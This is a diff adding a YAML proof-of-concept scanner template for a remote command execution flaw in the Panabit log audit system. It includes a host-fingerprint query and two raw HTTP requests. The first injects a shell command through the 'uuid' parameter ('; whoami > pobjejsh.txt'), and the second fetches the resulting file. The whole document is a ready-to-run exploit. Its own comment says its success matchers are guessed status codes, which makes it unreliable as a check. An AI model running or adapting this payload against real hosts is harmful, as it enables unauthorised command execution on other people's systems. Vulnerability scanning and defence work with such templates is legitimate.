@@ -1,0 +1,55 @@
+id: poc-a0cc6f583dcdd5d312d4
+info:
+  name: panabit日志审计系统mailcious_down_fornode远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a0cc6f583dcdd5d312d476a0d6007b9c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: a0cc6f583dcdd5d312d476a0d6007b9c
+    fofa: + hunter`app.name="Panabit 日志系统"`
+http:
+- raw:
+  - 'POST /mailcious_down_fornode.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+
+    Content-Length: 40
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Forwarded-For: 127.0.0.1,192.168.170.105,172.10.107.143
+
+
+    action=check&uuid=;whoami > pobjejsh.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /pobjejsh.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+
+    Connection: close
+
+    Content-Type: text/plain
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
